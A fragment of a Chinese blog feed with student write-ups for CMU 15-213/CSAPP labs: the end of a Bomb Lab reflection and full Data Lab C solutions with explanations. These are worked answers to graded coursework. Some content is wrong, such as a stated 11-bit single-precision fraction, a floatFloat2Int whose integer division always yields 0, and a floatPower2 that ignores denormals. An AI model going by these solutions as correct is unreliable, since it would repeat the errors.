进制的值加偏移量，使其为合法的<code>ASCII码</code>字符，是后来加查了 1 个题解晓得的。</li>\n<li><code>Phase 6</code>费大力气终于解决啦！当然我一开始没留意到是第<code>ecx</code>个数的<code>rdx</code>存储在地址数组的第<code>rsi</code>位，所以还以为链表的结点都是顺序排列的。解除 phase6 的经历也告诉我，看见汇编不要一开始上来就将它转化成 C 语言，要首先根据跳转目标对其进行分段，用流程图分析他的跳转，然后再将其拆解为各个小的过程（拆解的过程中尽量把循环放在一起，控制一下过程的规模），一步步的分析他，不要一上来就看题解&#x2F;暴力反汇编。而且要留意题意！比如第 5 题那个 ASCII 码字符，第 6 题要把顺序转化为<code>7 - 原来的值</code>，这都是容易做错的地方。</li>\n<li><code>secret_phase</code>顺利完结！二叉树的结构精妙极了！但是<code>secret_phase</code>的入口不好找，因为输入的字符串都在<code>%rdi</code>中，需要通过<code>gdb</code>查看哪个 phase 的 rdi 寄存器的值 &#x3D; 0x603870，这点很难。</li>\n</ol>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NTE2MjM1NzQ=\">手把手教你拆解 CSAPP 的 炸弹实验室 BombLab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NjEwNjg0NDU=\">CSAPP bomblab 隐藏关卡 secret_phase 拆弹记录</span></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "url": "https://salvely.github.io/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "title": "15213 Lab 1-data lab 实验记录",
            "date_published": "2024-02-05T07:50:22.000Z",
            "content_html": "<p>部分的题目我参考了一下网上的内容（出处已注明），其他的均为自己实现（有的题目的实现过程可能会有些繁琐），部分 dlc 检测出来可能会报些 error，但是 btest 均能过。</p>\n<blockquote>\n<p>没有 TA 可太难了！自己实现了一天多，终于苟完了。不算完美，但也能看吧。</p>\n</blockquote>\n<h2 id=\"bitXor\"><a href=\"#bitXor\" class=\"headerlink\" title=\"bitXor\"></a>bitXor</h2><pre><code class=\"c\">/*\n * bitXor - x^y using only ~ and &amp;\n *   Example: bitXor(4, 5) = 1\n *   Legal ops: ~ &amp;\n *   Max ops: 14\n *   Rating: 1\n */\nint bitXor(int x, int y)\n&#123;\n   /**\n    * x + y = ~( ~x &amp; ~y)\n    */\n   return ~((~(x &amp; ~y)) &amp; (~(y &amp; ~x)));\n&#125;\n</code></pre>\n<p>bitXor 要求我们使用位操作来实现<code>^</code>运算符。根据运算定律我们知道: <code>a ^ b = (a &amp; (~b)) | (b &amp; (~a))</code>。但是问题来了，我们这里不允许使用<code>|</code>，只能用<code>~</code>和<code>&amp;</code>。那么我们就必须使用这两个操作符来实现<code>|</code>运算。<br>通过德摩根定律我们知道：<code>a | b = ~((~a) &amp; (~b))</code>。这不就解决问题了嘛，所以将这两个式子综合一下，最后的结果是<code>~((~(x &amp; ~y)) &amp; (~(y &amp; ~x)))</code></p>\n<h2 id=\"tmin\"><a href=\"#tmin\" class=\"headerlink\" title=\"tmin\"></a>tmin</h2><pre><code class=\"c\">/*\n * tmin - return minimum two&#39;s complement integer\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 4\n *   Rating: 1\n */\nint tmin(void)\n&#123;\n   /**\n    * the most significant bit = 1, others = 0, so (1 &lt;&lt; 31)\n    */\n   return (1 &lt;&lt; 31);\n&#125;\n</code></pre>\n<p>这题要求我们返回最小的补码整数，返回类型为<code>int</code>。首先，在二进制补码表示中，最高位的权值为-1，其他位的权值为 1。因此，最小的补码整数 tmin 的最高位为 1，其他位为 0。而题目中<code>int</code>类型为 32 位，因此只要返回<code>(1 &lt;&lt; 31)</code>即可。</p>\n<h2 id=\"isTmax\"><a href=\"#isTmax\" class=\"headerlink\" title=\"isTmax\"></a>isTmax</h2><pre><code class=\"c\">/*\n * isTmax - returns 1 if x is the maximum, two&#39;s complement number,\n *     and 0 otherwise\n *   Legal ops: ! ~ &amp; ^ | +\n *   Max ops: 10\n *   Rating: 1\n */\nint isTmax(int x)\n&#123;\n   /**\n    * Tmax ^ Tmin = 0xffffffff, ~0xffffffff = 0x0, !0x0 = 0x1\n    */\n   // return !(~(x ^ (1 &lt;&lt; 31)));\n\n   /**\n    * ~Tmax = Tmin -&gt; ~Tmin + 1 = Tmin 且 Tmin != 0\n    */\n   int num = ~x;\n   return !(num ^ (~num + 1)) &amp; !!num;\n&#125;\n</code></pre>\n<p>tmax 是二进制补码中最大的数，通过分析这个数的特点，我们可以完成这道题目。</p>\n<ol>\n<li>该数除了最高位是 0 外，其他位均是 1。因此该数和(1&lt;&lt;31)（也就是 tmin）的亦或（或者和）为<code>0xffffffff</code>。<code>0xffffffff</code>按位取反得到<code>0x0</code>，而<code>0x0</code>按位取反得到<code>0x1</code>。但是其他的数并没有这个特性。</li>\n</ol>\n<pre><code class=\"c\">return !(~(x ^ (1 &lt;&lt; 31)));\n</code></pre>\n<ol start=\"2\">\n<li>该数取反后得到 tmin，tmin 的一个特点是 tmin 和 -tmin 的表示相同。因此两者亦或得到 0。还有一个树也有这样的特性，也就是 0。因此我们需要排除 0 的可能性。我们使用<code>&amp;</code>操作符来实现两种特性的叠加。我本没有想到该方法，是从这篇<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTQxMjY3OTU=\">知乎帖子</span>学习到的。</li>\n</ol>\n<pre><code class=\"c\">int num = ~x;\nreturn !(num ^ (~num + 1)) &amp; !!num;\n</code></pre>\n<p>但是题目不允许在该题中使用移位运算符，因此只能使用方法二。</p>\n<h2 id=\"allOddBits\"><a href=\"#allOddBits\" class=\"headerlink\" title=\"allOddBits\"></a>allOddBits</h2><pre><code class=\"c\">/*\n * allOddBits - return 1 if all odd-numbered bits in word set to 1\n *   where bits are numbered from 0 (least significant) to 31 (most significant)\n *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 12\n *   Rating: 2\n */\nint allOddBits(int x)\n&#123;\n   /**\n    * tear the number into 4 parts, get rid of the other digits except 0xaa\n    * if the results are all the same, then compare it with 0xaa, if there are the same, xor returns 0\n    * otherwise not all odd bits in word set is set to 1\n    */\n   int first = (x &gt;&gt; 24) &amp; 0xaa;\n   int second = (x &gt;&gt; 16) &amp; 0xaa;\n   int third = (x &gt;&gt; 8) &amp; 0xaa;\n   int fourth = x &amp; 0xaa;\n   return !((first &amp; second &amp; third &amp; fourth) ^ 0xaa);\n&#125;\n</code></pre>\n<p>对于单个字节的奇数位，我们可以使用<code>0xaa</code>作为 mask。<br>本题目中我将位打成 4 个部分，每个部分与 mask 相与。如果每个奇数位都是 1 的话，四个部分的比较结果应该相同，都等于<code>0xaa</code>，该值与<code>0xaa</code>异或得到<code>0x0</code>，取<code>!</code>后得到<code>0x1</code>。否则该值不为<code>0xaa</code>，同<code>0xaa</code>亦或得到其他非零值，取<code>!</code>后得到<code>0x0</code>。</p>\n<h2 id=\"negate\"><a href=\"#negate\" class=\"headerlink\" title=\"negate\"></a>negate</h2><pre><code class=\"c\">/*\n * negate - return -x\n *   Example: negate(1) = -1.\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 5\n *   Rating: 2\n */\nint negate(int x)\n&#123;\n   return (~x + 1);\n&#125;\n</code></pre>\n<p>该题目中我们需要求解某个数的相反数。在课堂中我们学过，一个数和它相反数的和为 0。那么如何获得其相反数呢？以<code>x</code>为例，我们知道<code>x + ~x = ~0</code>，也就是全 f，然后<code>~0 + 1 = 0</code>。因此，<code>-x</code>的补码表示即为<code>~x + 1</code>。</p>\n<h2 id=\"isAsciiDigit\"><a href=\"#isAsciiDigit\" class=\"headerlink\" title=\"isAsciiDigit\"></a>isAsciiDigit</h2><pre><code class=\"c\">/*\n * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#39;0&#39; to &#39;9&#39;)\n *   Example: isAsciiDigit(0x35) = 1.\n *            isAsciiDigit(0x3a) = 0.\n *            isAsciiDigit(0x05) = 0.\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 15\n *   Rating: 3\n */\nint isAsciiDigit(int x)\n&#123;\n   /**\n    * least = (x &amp; 0xf) - 0xa\n    * if least &gt; 0 (with 0 in most significant bit) then least = 0\n    * else least = 1\n    */\n   int least = ((((x &amp; 0xf) + (~0xa + 1)) &gt;&gt; 31) &amp; 0x1);\n   int second = !((x &gt;&gt; 4) ^ 0x3);\n   return least &amp; second;\n&#125;\n</code></pre>\n<p>这里我使用的方法是将该数拆分为最低位和其他位来比较。我们将最低位与<code>0xa</code>相减，如果求得的结果为负数，符号位即为 1，代表该值在 0-9 之间。接下来判断其他位是否为<code>0x3</code>，如果是，则和<code>0x3</code>异或结果为 0，通过逻辑<code>!</code>返回 1。</p>\n<h2 id=\"conditional\"><a href=\"#conditional\" class=\"headerlink\" title=\"conditional\"></a>conditional</h2><pre><code class=\"c\">/*\n * conditional - same as x ? y : z\n *   Example: conditional(2,4,5) = 4\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 16\n *   Rating: 3\n */\nint conditional(int x, int y, int z)\n&#123;\n   /**\n    * judge if x != 0, if true, !!x = 1, return y, otherwise !!x = 0, return z\n    */\n\n   // cond gets all f when !!x == 1\n   int cond = ((!!x) &lt;&lt; 31) &gt;&gt; 31;\n   return (cond &amp; y) | (~cond &amp; z);\n&#125;\n</code></pre>\n<p>这里我们先获取<code>x</code>的值，如果<code>x != 0</code>，则<code>!!x = 0x1</code>，否则为<code>0x0</code>。扩展该值，当该值为<code>0x1</code>时与<code>y</code>相与得到 y。当该值为<code>0x0</code>，取反后与 z 相与得到 z。因为这两个值只取其一，当一边不为 0 时另一边必然为 0，因此两边用<code>|</code>连接。</p>\n<h2 id=\"isLessOrEqual\"><a href=\"#isLessOrEqual\" class=\"headerlink\" title=\"isLessOrEqual\"></a>isLessOrEqual</h2><blockquote>\n<p>本题要求使用最多 24 个运算符，但是这里我使用的过多了，应该会有更好的办法。期待有人指正。</p>\n</blockquote>\n<pre><code class=\"c\">/*\n * isLessOrEqual - if x &lt;= y  then return 1, else return 0\n *   Example: isLessOrEqual(4,5) = 1.\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 24\n *   Rating: 3\n */\nint isLessOrEqual(int x, int y)\n&#123;\n   // first compare their sign bit\n   int sign_x = (x &gt;&gt; 31) &amp; 0x1;\n   int sign_y = (y &gt;&gt; 31) &amp; 0x1;\n   // return true if sign = 1(&gt;0)\n   int sign_diff = sign_x + (~sign_y + 1);\n   int sign_bit = (sign_diff &gt;&gt; 31) &amp; 0x1;\n\n   // then compare the magnitude\n   int mask = (~0) + (0x1 &lt;&lt; 31);\n   int mag_x = x &amp; mask;\n   int mag_y = y &amp; mask;\n   int mag_diff = mag_x + (~mag_y + 1);\n   int mag_sign = !(mag_x ^ mag_y) | ((mag_diff &gt;&gt; 31) &amp; 0x1);\n\n   /**\n    * 2 conditions return true:\n    * 1. sign of x = 1 and sign of y = 0\n    * 2. sign of x and y equals, and magnitude of x &lt;= y\n    */\n   return (((!sign_bit) &amp; sign_diff) | ((!sign_diff) &amp; mag_sign));\n&#125;\n</code></pre>\n<p>这里要分几种情况：</p>\n<ol>\n<li>x 为负数，y 为正数，直接返回<code>0x1</code></li>\n<li>x 和 y 同符号，比较数值部分。x &lt;&#x3D; y 时，返回<code>0x1</code>；x &gt; y 时，返回<code>0x0</code></li>\n<li>x 为正数，y 为负数，返回<code>0x0</code></li>\n</ol>\n<p>其中<code>sign_diff</code>为两数符号位之差，此处分三种情况：</p>\n<ol>\n<li>x 为负数，符号位为 1；y 为正数，符号位为 0。那么两者符号位相减等于<code>0x1</code>，该值的符号位为 0。（这是我们要返回<code>0x1</code>的结果）</li>\n<li>x 为正数，符号位为 0；y 为负数，符号位为 1。那么两者符号位相减等于<code>0xffffffff</code>(-1)，该值的符号位为 1。（我们不要这个结果）</li>\n<li>x 和 y 的符号位相同，两者相减为<code>0x0</code>，该值的符号位为 0。（这里我们要看情况，看<code>x</code>是否和<code>y</code>相等）</li>\n</ol>\n<p>代码中<code>sign_diff</code>为两符号位之差，<code>sign_bit</code>为该做差结果的最高位。当 x 和 y 的符号位不相同时，当<code>sign_diff</code>为<code>0x1</code>且<code>sign_bit</code>为<code>0x0</code>是，我们返回<code>0x1</code>。这也是运算结果<code>|</code>左半边的由来。</p>\n<p>代码中<code>mag_diff</code>为两者数值部分之差，<code>mag_sign</code>为该差值的符号位。当<code>x &lt; y</code>时，<code>mag_diff</code>为<code>0xffffffff</code>。当<code>x == y</code>时，<code>!(mag_x ^ mag_y)</code>为<code>0x1</code>。因此<code>mag_sign = !(mag_x ^ mag_y) | ((mag_diff &gt;&gt; 31) &amp; 0x1)</code>。在判断数值之差部分时，我们需要保证两数符号位之差为<code>0x0</code>，而不是其他（如 x 正 y 负）。因此运算结果右半边的值为<code>(!sign_diff) &amp; mag_sign</code>。</p>\n<p>综上，最后的结果是<code>((!sign_bit) &amp; sign_diff) | ((!sign_diff) &amp; mag_sign)</code>。</p>\n<h2 id=\"logicalNeg\"><a href=\"#logicalNeg\" class=\"headerlink\" title=\"logicalNeg\"></a>logicalNeg</h2><pre><code class=\"c\">/*\n * logicalNeg - implement the ! operator, using all of\n *              the legal operators except !\n *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1\n *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 12\n *   Rating: 4\n */\nint logicalNeg(int x)\n&#123;\n   /**\n    * if x == 0, x ^ 0x0 = 0\n    */\n   return ((x | (x + ~0 + (~(1 &lt;&lt; 31) + 1))) &gt;&gt; 31) + 1;\n&#125;\n</code></pre>\n<p>这道题的难点在于：</p>\n<ol>\n<li>将 0 映射到 0x1</li>\n<li>将非 0 值映射到 0x0</li>\n</ol>\n<p>在一开始实现时，我的思路是对于 0，可以和<code>0x0</code>异或，判断为 0。但是对于非 0 的数，和<code>0x0</code>异或后还是他自己，我们也不知道 1 落在其中哪个位上，一个个位去找也不现实。那么就需要思考其他的办法。从<code>0x0</code>这个数和其他数的特点下手。这里我参考了<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaW5nZmVuLmdpdGh1Yi5pby9jc2FwcC8yMDIxLzA0LzMwL0NTQVBQTGFiMDEuaHRtbA==\">这篇博客</span>。</p>\n<p>其给出的思路是：<br>-x 为 x 按位取反再+1。</p>\n<ul>\n<li>如果一个数为全 0，和相反数相<code>|</code>后结果全部是 0，加 1 后得到<code>0x1</code></li>\n<li>否则结果最高位必然含有 1。向右移动 31 位获得<code>~0</code>，再加 1 得到<code>0x0</code></li>\n</ul>\n<p>问题可改为，如何判断一个数全为 0 。注意到，-x 相当于按位取反再加一，如果 x 为 非 0 数，那么 x|(-x) 后必定为 -1 。利用这个性质，即可判断是否为 0 。</p>\n<h2 id=\"howManyBits\"><a href=\"#howManyBits\" class=\"headerlink\" title=\"howManyBits\"></a>howManyBits</h2><pre><code class=\"c\">/* howManyBits - return the minimum number of bits required to represent x in\n *             two&#39;s complement\n *  Examples: howManyBits(12) = 5\n *            howManyBits(298) = 10\n *            howManyBits(-5) = 4\n *            howManyBits(0)  = 1\n *            howManyBits(-1) = 1\n *            howManyBits(0x80000000) = 32\n *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *  Max ops: 90\n *  Rating: 4\n */\nint howManyBits(int x)\n&#123;\n   /**\n    * divide and conquer\n    * for positive number, the number of bits = the last position of 1 + 1\n    * for negative number, the number of bits = the last position of 1\n    * inverse negative number and deal with it as the same as positive number\n    * 1. judge the sign bit of x, if x is negative, inverse it\n    * 2. judge the high 16 bits, if true(high 16 bits != 0x0), result + 16\n    * 3. judge the high 8 bits, if true, result + 8\n    * 4. judge the high 4 bits, if true, result + 4\n    * 5. judge the high 2 bits, if true, result + 2\n    * 6. judge the high 1 bits, if true, result + 1\n    * 7. judge the last 1 bit, if true, result + !!x\n    * 8. the final sum must + 1\n    * 9. return the result\n    */\n   // neg x if it&#39;s negative\n   int sign = ((x &amp; (1 &lt;&lt; 31)) &gt;&gt; 31);\n   x = (sign &amp; ~x) | (~sign &amp; x);\n\n   int b16, b8, b4, b2, b1, b0;\n\n   // int mask_16 = (1 &lt;&lt; 15) &gt;&gt; 15;\n   b16 = !!(x &gt;&gt; 16) &lt;&lt; 4;\n   x = x &gt;&gt; b16;\n\n   // int mask_8 = 0xff;\n   b8 = !!(x &gt;&gt; 8) &lt;&lt; 3;\n   x = x &gt;&gt; b8;\n\n   // int mask_4 = 0xf;\n   b4 = !!(x &gt;&gt; 4) &lt;&lt; 2;\n   x = x &gt;&gt; b4;\n\n   // int mask_2 = 0x3;\n   b2 = !!(x &gt;&gt; 2) &lt;&lt; 1;\n   x = x &gt;&gt; b2;\n\n   // int mask_1 = 0x1;\n   b1 = !!(x &gt;&gt; 1);\n   x = x &gt;&gt; b1;\n\n   //! judge if the last bit == 1\n   b0 = !!x;\n\n   return b16 + b8 + b4 + b2 + b1 + b0 + 1;\n&#125;\n</code></pre>\n<p>在这个题目中，我们主要采用分而治之的方法。分治方法的几道例题可以参考 CMU 15-213 课程的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MuY211LmVkdS9hZnMvY3MvYWNhZGVtaWMvY2xhc3MvMTUyMTMtZjIzL3d3dy9yZWNpdGF0aW9ucy9yZWMwMV9zb2x1dGlvbnMucGRm\">Recitation Slides</span>。</p>\n<p>首先，我们可以看到，如果该数是一个正数，则其最高位必然是 0，该数的位数 &#x3D; 最高一个 1 的位置 + 1；<br>如果该数是一个负数，该数的位数 &#x3D; 最高一个 1 的位置。<br>我们不想那么麻烦，把正负数分开讨论，因此我们把负数翻转过来。</p>\n<p>在这道题中我们采用的方法是：</p>\n<ol>\n<li>判断高 16 位是否有 1（把数向右移动 16 位后，结果不为 0，<code>!!(x &gt;&gt; 16)</code>）。<code>b16 = !!(x &gt;&gt; 16) &lt;&lt; 4</code>。如果是的话，把数值向右移动 16 位<code>(x&gt;&gt;b16)</code>。把<code>b16</code>添加到结果中去。这里一个妙用在于如果<code>!!(x &gt;&gt; 16）= 0x1</code>，<code>!!(x &gt;&gt; 16) &lt;&lt; 4</code>可以直接起到获得数字 16 的方法，无需增加其他的运算。</li>\n<li>判断高 8 位是否有 1，操作同上</li>\n<li>判断高 4 位是否有 1，操作同上</li>\n<li>判断高 2 位是否有 1，操作同上</li>\n<li>判断高 1 位是否有 1，操作同上</li>\n<li>判断该位是否有 1</li>\n<li>结果 + 1（位数 &#x3D; 最高一个 1 的位置 + 1）</li>\n<li>最后把所有判断结果加起来（每次判断的结果都是一个累加的位数，加在一起就是最后的总位数）</li>\n</ol>\n<h2 id=\"浮点数复习\"><a href=\"#浮点数复习\" class=\"headerlink\" title=\"浮点数复习\"></a>浮点数复习</h2><p>在完成浮点数部分的题目之前，我们需要复习一下浮点数的和其表示方法：</p>\n<ul>\n<li>单精度浮点数：1 位符号位 + 8 位阶码(exp) + 11 位尾数(frac)</li>\n<li>双精度浮点数：1 位符号位 + 11 位阶码(exp) + 52 位尾数(frac)</li>\n</ul>\n<p>其中阶码使用移码表示。$bias &#x3D; 2^{k-1}-1$</p>\n<p>浮点数分为三类：</p>\n<ul>\n<li>规格化数：阶码不全为 1 也不全为 0，尾数前有隐含的 1，指数$E&#x3D;exp - bias$，分布在非规格化数外侧</li>\n<li>非规格化数：阶码全为 0，尾数前隐含 0，指数$E&#x3D;1 - bias$，主要分布在靠近 0 侧</li>\n<li>特殊值：阶码全为 1，若尾数全为 0，则为<code>inf</code>，否则为<code>NaN</code></li>\n</ul>\n<h2 id=\"floatScale2\"><a href=\"#floatScale2\" class=\"headerlink\" title=\"floatScale2\"></a>floatScale2</h2><pre><code class=\"c\">// float\n/*\n * floatScale2 - Return bit-level equivalent of expression 2*f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int&#39;s, but\n *   they are to be interpreted as the bit-level representation of\n *   single-precision floating point values.\n *   When argument is NaN, return argument\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned floatScale2(unsigned uf)\n&#123;\n   // first get the sign, exp and mag bit of the number\n   unsigned sign = (uf &gt;&gt; 31) &amp; 0x1;\n   unsigned e = (uf &gt;&gt; 23) &amp; ((1 &lt;&lt; 8) - 1);\n   unsigned f = (uf &amp; ((1 &lt;&lt; 23) - 1));\n\n   if (e == 0)\n   &#123;\n      // denormalized number\n      // E = 1 - bias\n      // frac = f\n\n      //! how to multiply a denormalized number? frac * 2!\n      f = f * 2;\n   &#125;\n   else if (e == 0xff)\n   &#123;\n      // special number\n      // if frac = 0, then value = inf\n      if (f == 0)\n      &#123;\n         // frac = 1 / 0;\n         return uf;\n      &#125;\n      else\n      &#123;\n         // if frac != 0, value = NaN\n         return uf;\n      &#125;\n   &#125;\n   else\n   &#123;\n      // normalized number\n      // E = e - bias\n      // value = 1 + f\n\n      e += 1;\n      if (e == ~0)\n      &#123;\n         return uf;\n      &#125;\n   &#125;\n\n   return (sign &lt;&lt; 31) | (e &lt;&lt; 23) | f;\n&#125;\n</code></pre>\n<p>本题目要求是计算一个 unsigned 形式表示的浮点数 <code>* 2</code> 后的表示。在完成这题之前，我们首先把浮点数的几个部分提取出来，分几个情况讨论：</p>\n<ul>\n<li>非规格化数：指数不变，尾数乘 2。<strong>问题来了，这到底是为什么？因为当exp全为0时，exp &#x3D; 0, E &#x3D; 1 - bias, frac &#x3D; 0.f。乘以2就相当于把f左移一位，最高位会进到exp的位置去。如果f最高位是0，左移一位不影响exp（全0）。如果f最高位是1，左移一位后该数变为规格化数，exp变为1，E依然等于 1 - bias。实现了非规格化数到规格化数的平滑过渡（非常重要！）</strong></li>\n<li>规格化数：首先将指数 + 1，然后判断是否为特殊值，若是则返回<code>uf</code>。</li>\n<li>特殊值：<code>e = 0</code>，直接返回<code>uf</code>（根据题目意思）</li>\n</ul>\n<p>将符号位，指数和尾数三个部分拼凑起来，直接返回（本题中无需进行任何计算）。</p>\n<h2 id=\"floatFloat2Int\"><a href=\"#floatFloat2Int\" class=\"headerlink\" title=\"floatFloat2Int\"></a>floatFloat2Int</h2><blockquote>\n<p>本题中不允许使用<code>double</code>类型，我擅自用了，这里应该是不严谨的。</p>\n</blockquote>\n<pre><code class=\"c\">/*\n * floatFloat2Int - Return bit-level equivalent of expression (int) f\n *   for floating point argument f.\n *   Argument is passed as unsigned int, but\n *   it is to be interpreted as the bit-level representation of a\n *   single-precision floating point value.\n *   Anything out of range (including NaN and infinity) should return\n *   0x80000000u.\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nint floatFloat2Int(unsigned uf)\n&#123;\n   // first get the sign, exp and mag bit of the number\n   unsigned sign = (uf &gt;&gt; 31) &amp; 0x1;\n   unsigned e = (uf &gt;&gt; 23) &amp; ((1 &lt;&lt; 8) - 1);\n   float f = (uf &amp; ((1 &lt;&lt; 23) - 1)) / (1 &lt;&lt; 23);\n\n   // then get the exact sign, E and value of the number\n   int s = 0;\n   if (sign == 0)\n      s = 1;\n   else\n      s = -1;\n\n   int E = 0;\n   float frac = 0;\n   int bias = 127;\n   if (e == 0)\n   &#123;\n      // denormalized number\n      // E = 1 - bias\n      E = 1 - bias;\n      // frac = f\n      frac = f;\n   &#125;\n   else if (e == 0xff)\n   &#123;\n      //! COMPARE WITH 0XFF INSTEAD OF ~0\n      // special number\n      // if frac = 0, then value = inf\n      if (f == 0)\n      &#123;\n         // frac = 1 / 0;\n         return 0x80000000u;\n      &#125;\n      else\n      &#123;\n         // if frac != 0, value = NaN\n         return 0x80000000u;\n      &#125;\n   &#125;\n   else\n   &#123;\n      // normalized number\n      // E = e - bias\n      E = e - bias;\n      // value = 1 + f\n      frac = 1 + f;\n   &#125;\n   if (E &lt; 0)\n   &#123;\n      return 0;\n   &#125;\n   else if (E &gt; 31)\n   &#123;\n      //! REMEMBER THE SITUATION THAT E &gt; 31\n      return 0x80000000u;\n   &#125;\n\n   return s * frac * (1 &lt;&lt; E);\n&#125;\n</code></pre>\n<p>本题需要返回浮点数转化后的 int 类型数值。需要我们对浮点数的结构有所了解，并且其转化为 int 后需要切割掉小数部分，此外，我们还需要判断指数过大的情况（溢出）。</p>\n<p>本题中我们采用的步骤是：</p>\n<ol>\n<li>提取出浮点数三个部分，计算符号位的值</li>\n<li>当<code>e == 0</code>时，为特殊值的情况，<code>E = 1 - bias</code>，<code>frac = f</code></li>\n<li>当<code>e == 0xff</code>时（注意不是<code>~0/0xffffffff</code>,容易写错！），返回<code>0x80000000u</code></li>\n<li>以上两种情况都不是，则该数为规格化数，<code>E = e - bias; frac = 1 + f;</code></li>\n</ol>\n<p>最后，我们需要进行<strong>特殊情况的分类讨论</strong>：</p>\n<ol>\n<li>E &lt; 0, 则最后生成的结果（无论规格化还是非规格化）肯定是个小数，打头的是 0 那种，要切割为<code>int</code>类型，小数部分就被切割掉了</li>\n<li>E &gt; 31, 超过了指数可以表示的范围（算是溢出了？），返回<code>0x80000000u</code></li>\n<li>正常情况下返回<code>s * frac * (1 &lt;&lt; E)</code></li>\n</ol>\n<h2 id=\"floatPower2\"><a href=\"#floatPower2\" class=\"headerlink\" title=\"floatPower2\"></a>floatPower2</h2><pre><code class=\"c\">/*\n * floatPower2 - Return bit-level equivalent of the expression 2.0^x\n *   (2.0 raised to the power x) for any 32-bit integer x.\n *\n *   The unsigned value that is returned should have the identical bit\n *   representation as the single-precision floating-point number 2.0^x.\n *   If the result is too small to be represented as a denorm, return\n *   0. If too large, return +INF.\n *\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned floatPower2(int x)\n&#123;\n   //! REMEMEBER THAT FLOATING POINT ITSELF IS IN THE FORMAT (-1)^S * M * 2.0^E\n   // fit x into E\n   x = x + 127;\n   //! MIND THE SITUATION THAT X IS TOO LARGE OR TOO SMALL\n   if (x &gt;= 0xff)\n      x = 0xff;\n   else if (x &lt;= 0)\n      x = 0;\n   unsigned result = (x &lt;&lt; 23);\n   return result;\n&#125;\n</code></pre>\n<p>因为浮点数表示法本身就是以 2 为底，所以本实验就相当于如何把 x 转化为那个 8 位的阶码。因为<code>阶码 = 指数 + bias</code>，这里<code>bias = 127</code>，因此这里<code>E = x + 127</code>。然后和上一题一样，我们需要判断一下 x 的范围是否在<code>0xff</code>和<code>0</code>之间。最后将 x 移动到阶码的位置返回(<code>return x &lt;&lt; 23</code>)即可。</p>\n<h2 id=\"参考实现\"><a href=\"#参考实现\" class=\"headerlink\" title=\"参考实现\"></a>参考实现</h2><p>在完成 data lab 过程中，我参考了部分如下几个博客的实现:</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTQxMjY3OTU=\">CSAPP 实验一：DataLab 详细讲解与满分代码</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NDk4Nzc0NzU=\">lab1 CSAPP：datalab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NTc0ODExMTI=\">CSAPP lab1: datalab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaW5nZmVuLmdpdGh1Yi5pby9jc2FwcC8yMDIxLzA0LzMwL0NTQVBQTGFiMDEuaHRtbA==\">深入理解计算机系统之位操作实验</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vanlpMnlhL3AvMTU4ODExNzUuaHRtbA==\">CSAPP Data Lab 做题记录（下</span></li>\n</ul>\n",
            "tags": []
        }
    ]
}